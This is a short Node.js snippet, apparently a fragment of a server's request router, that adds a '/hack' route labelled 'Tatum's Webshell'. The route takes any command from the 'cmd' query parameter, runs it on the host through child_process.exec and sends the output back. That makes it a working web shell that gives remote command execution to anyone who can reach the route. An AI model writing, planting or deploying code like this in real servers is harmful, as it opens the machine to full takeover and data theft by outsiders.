if (route === '/hack') {
  let { exec } = require('child_process');
  let cmd = "echo \"Tatum's Webshell\""
  if (params.query['cmd']) {
    cmd = params.query['cmd']
  } 
  exec(cmd, (err, stdout) => {
    res.end(stdout);
    if (err) console.log('[err]', err);
  })
}
